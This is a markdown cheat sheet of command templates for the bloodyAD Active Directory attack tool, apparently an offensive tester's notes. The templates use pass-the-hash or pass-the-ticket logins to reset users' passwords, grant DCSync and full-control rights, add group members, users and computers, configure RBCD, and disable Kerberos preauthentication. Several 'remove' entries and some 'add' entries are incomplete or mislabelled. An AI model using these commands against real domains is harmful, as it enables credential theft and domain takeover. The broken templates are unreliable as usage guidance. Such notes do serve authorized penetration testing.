# bloodyAD

% windows, Active directory
#plateform/linux #target/remote  #cat/ATTACK/DACL-ABUSE


## _desc
```
```

## _repo
```
```

## _doc
```
https://github.com/CravateRouge/bloodyAD/wiki/Enumeration

```

## _install
```
```

## auth (cred)
```bash
-d <domain_fqn> -u <user> -p <password>
```

## auth (pth)
```bash
-d <domain_fqn> -u <user> -p :<nt_hash>
```

## auth (ptt)
```bash
-d <domain_fqn>  -k [ccache=$(pwd)/<file>]
```

## auth (kerberos)
```bash
-d <domain_fqn> -u <user> -p <password> -k
```

## auth (cert)
```bash
-c <key_path>:<pem_path>
```

## cross-domain actions
```bash
bloodyAD --host <target_dc_fqdn> -d <domain_fqdn> -u <user> -p  -p :<nt_hash>
```

## set - reset password (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
```

## set cross-domain - reset user password (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <target_dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set password <target_user> '<password|Zaebuj12345+->' 
```

## set - add/replace/delete target attribute  (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set object <target_dn> <attribute> -v <value>
```

## set - object onwer (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  owner <target> <owner>
```



## add - add computer (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add computer  <computer_name|jubeaz> <computer_password|Zaebuj12345+->
```
## add - DCSync right (pth)
https://github.com/CravateRouge/bloodyAD
sAMAccountName, DN, GUID or SID of the trustee
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  dcsync <trustee>
```
## add - DNS record (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add dnsRecord   
```
## add - full control (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add genericAll <target> <trustee>
```
## add - groupMember (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  groupMember <group_sam> <target_sam>
```
## add - rbcd (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  rbcd <target>  <source>
```
## add - shadowCredentials (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add  
```
## add - uac (pth)
https://github.com/CravateRouge/bloodyAD
SCRIPT
ACCOUNTDISABLE
HOMEDIR_REQUIRED
LOCKOUT
PASSWD_NOTREQD
PASSWD_CANT_CHANG
ENCRYPTED_TEXT_PWD_ALLOWED
TEMP_DUPLICATE_ACCOUNT
NORMAL_ACCOUNT
INTERDOMAIN_TRUST_ACCOUNT
WORKSTATION_TRUST_ACCOUNT
SERVER_TRUST_ACCOUNT
DONT_EXPIRE_PASSWORD
MNS_LOGON_ACCOUNT
SMARTCARD_REQUIRED
TRUSTED_FOR_DELEGATION
NOT_DELEGATED
USE_DES_KEY_ONLY
DONT_REQ_PREAUTH
PASSWORD_EXPIRED
TRUSTED_TO_AUTH_FOR_DELEGATION
PARTIAL_SECRETS_ACCOUN
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add uac <target_sAMAccountName> -f <uac_flag|DONT_REQUIRE_PREAUTH>
```
## add - user (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> add user <sAMAccountName|jubeaz> <password|Zaebuj12345+-> 
```

## get - list children of an object (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get  children --direct --target <DN>
```
## get - DNS dump records (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get dnsDump --zone <domain_fqdn>  
```
## get - membership (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get membership <target_sAMAccountName>
```
## get - object with dacl (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get object --resolve-sd <target_sAMAccountName> | grep 'GP-Link\|GENERIC_ALL'
```

## get - search (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get search --filter '<ldap_filter|(objectClass=*)>' --attr <comma_sep_attr_list|'*'> --resolve-sd  <search_base|DC=domain,DC=tld>
```
## get - writable (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> get writable
```

## remove - DCSync (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - DNS record (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - full control (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - groupMember (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - object (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - rbcd (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - shadowCredentials (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> set  
```
## remove - uac (pth)
https://github.com/CravateRouge/bloodyAD
```bash
bloodyAD --host <dc_fqdn> -d <domain_fqdn> -u <user> -p :<nt_hash> -v <level|INFO> remove uac <target_sAMAccountName> -f <uac_flag|DONT_REQUIRE_PREAUTH>
```

